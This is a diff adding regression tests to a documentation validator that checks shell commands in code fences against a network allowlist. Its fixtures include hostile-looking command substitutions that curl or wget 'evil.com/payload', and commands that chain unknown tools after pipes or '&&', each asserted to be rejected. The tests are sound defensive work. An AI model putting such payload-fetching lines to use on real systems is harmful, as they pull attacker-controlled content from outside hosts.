@@ -834,3 +834,125 @@ test("validateFence: multiple clean known-tool substitutions pass", () => {
   const errors = validateFence(fence("echo $(node --version) $(echo ok)\n"));
   assert.equal(errors.length, 0);
 });
+
+// ---------------------------------------------------------------------------
+// Network-allowlist bypass regression tests (commit 03715a3 gap)
+//
+// Previously validateCommandSubstitutions only checked whether the executable
+// name was in KNOWN_TOOLS.  That meant curl/wget to arbitrary domains inside
+// $(...) or `...` were silently accepted because "curl" is a known tool.
+// The tests below are the specific cases the maintainer reported.
+// ---------------------------------------------------------------------------
+
+test("validateFence: rejects curl to arbitrary domain inside $() — argument position", () => {
+  // echo $(curl https://evil.com/payload) must be caught.
+  const errors = validateFence(fence("echo $(curl https://evil.com/payload)\n"));
+  assert.equal(errors.length, 1);
+  assert.match(errors[0], /not in allowlist/);
+  assert.match(errors[0], /evil\.com/);
+});
+
+test("validateFence: rejects curl to arbitrary domain inside backtick — argument position", () => {
+  // echo `curl https://evil.com/payload` must be caught.
+  const errors = validateFence(fence("echo `curl https://evil.com/payload`\n"));
+  assert.equal(errors.length, 1);
+  assert.match(errors[0], /not in allowlist/);
+  assert.match(errors[0], /evil\.com/);
+});
+
+test("validateFence: rejects curl to arbitrary domain inside $() assignment — SIGNED_XDR", () => {
+  // SIGNED_XDR=$(curl https://evil.com/payload) must be caught.
+  const errors = validateFence(fence("SIGNED_XDR=$(curl https://evil.com/payload)\n"));
+  assert.equal(errors.length, 1);
+  assert.match(errors[0], /not in allowlist/);
+  assert.match(errors[0], /evil\.com/);
+});
+
+test("validateFence: rejects curl to arbitrary domain inside backtick assignment — SIGNED_XDR", () => {
+  // SIGNED_XDR=`curl https://evil.com/payload` must be caught.
+  const errors = validateFence(fence("SIGNED_XDR=`curl https://evil.com/payload`\n"));
+  assert.equal(errors.length, 1);
+  assert.match(errors[0], /not in allowlist/);
+  assert.match(errors[0], /evil\.com/);
+});
+
+test("validateFence: rejects wget to arbitrary domain inside $()", () => {
+  const errors = validateFence(fence("echo $(wget https://evil.com/payload)\n"));
+  assert.equal(errors.length, 1);
+  assert.match(errors[0], /not in allowlist/);
+  assert.match(errors[0], /evil\.com/);
+});
+
+test("validateFence: rejects wget to arbitrary domain inside backticks", () => {
+  const errors = validateFence(fence("echo `wget https://evil.com/payload`\n"));
+  assert.equal(errors.length, 1);
+  assert.match(errors[0], /not in allowlist/);
+  assert.match(errors[0], /evil\.com/);
+});
+
+test("validateFence: rejects compound command inside $() — unknown tool after pipe", () => {
+  // $(echo foo | totally-unknown-tool) — the second segment must be validated.
+  const errors = validateFence(fence("echo $(echo foo | totally-unknown-tool)\n"));
+  assert.ok(errors.some((e) => /unknown executable/.test(e) && /totally-unknown-tool/.test(e)));
+});
+
+test("validateFence: rejects compound command inside backticks — unknown tool after semicolon", () => {
+  // `echo foo; totally-unknown-tool` — the second segment must be validated.
+  const errors = validateFence(fence("echo `echo foo; totally-unknown-tool`\n"));
+  assert.ok(errors.some((e) => /unknown executable/.test(e) && /totally-unknown-tool/.test(e)));
+});
+
+test("validateFence: rejects curl to arbitrary domain inside compound $() after &&", () => {
+  // git clone ... && echo $(curl https://evil.com/payload)
+  const errors = validateFence(
+    fence(
+      "git clone https://github.com/wraith-protocol/contracts.git && " +
+      "echo $(curl https://evil.com/payload)\n",
+    ),
+  );
+  assert.ok(errors.some((e) => /not in allowlist/.test(e) && /evil\.com/.test(e)));
+});
+
+// Ensure allowlisted substitutions still pass after the fix.
+
+test("validateFence: allowlisted curl inside $() still passes — friendbot addr subshell", () => {
+  // The existing friendbot-via-subshell pattern in NETWORK_ALLOWLIST.
+  const code =
+    'curl "https://friendbot.stellar.org/?addr=$(stellar keys address my-key)"\n';
+  assert.equal(validateFence(fence(code)).length, 0);
+});
+
+test("validateFence: allowlisted curl inside $() still passes — Wraith API endpoint", () => {
+  // Wraith API is in NETWORK_ALLOWLIST; nesting it inside a documented-var
+  // substitution must stay valid. SIGNED_XDR is in KNOWN_ENV_VARS.
+  const errors = validateFence(
+    fence("SIGNED_XDR=$(curl https://api.usewraith.xyz/agent/info/payments)\n"),
+  );
+  assert.equal(errors.length, 0);
+});
+
+test("validateCommandSubstitutions: rejects curl to arbitrary domain inside $() directly", () => {
+  const errors = [];
+  validateCommandSubstitutions("$(curl https://evil.com/payload)", "file.mdx:1", errors);
+  assert.equal(errors.length, 1);
+  assert.match(errors[0], /not in allowlist/);
+  assert.match(errors[0], /evil\.com/);
+});
+
+test("validateCommandSubstitutions: rejects curl to arbitrary domain inside backtick directly", () => {
+  const errors = [];
+  validateCommandSubstitutions("`curl https://evil.com/payload`", "file.mdx:1", errors);
+  assert.equal(errors.length, 1);
+  assert.match(errors[0], /not in allowlist/);
+  assert.match(errors[0], /evil\.com/);
+});
+
+test("validateCommandSubstitutions: allows allowlisted curl inside $()", () => {
+  const errors = [];
+  validateCommandSubstitutions(
+    "$(curl https://api.usewraith.xyz/agent/info/payments)",
+    "file.mdx:1",
+    errors,
+  );
+  assert.equal(errors.length, 0);
+});
